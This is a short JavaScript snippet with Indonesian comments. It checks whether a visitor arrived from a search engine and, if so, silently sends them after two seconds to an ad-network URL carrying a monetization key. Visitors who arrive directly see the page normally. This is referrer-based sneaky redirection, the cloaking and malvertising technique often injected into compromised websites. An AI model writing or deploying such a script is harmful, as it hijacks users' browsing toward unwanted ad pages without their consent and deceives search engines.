// Script Redirect Sederhana
(function() {
    // Tunggu halaman selesai dimuat
    window.addEventListener('load', function() {
        // Daftar search engine
        const searchEngines = ['google.', 'bing.', 'yahoo.', 'search.'];
        const referrer = document.referrer.toLowerCase();
        const redirectUrl = 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893';
        
        // Cek apakah ada referrer
        if (referrer && referrer !== '') {
            // Cek apakah referrer dari search engine
            for (const engine of searchEngines) {
                if (referrer.includes(engine)) {
                    // Redirect setelah 2 detik
                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 2000);
                    break;
                }
            }
        }
    });
})();
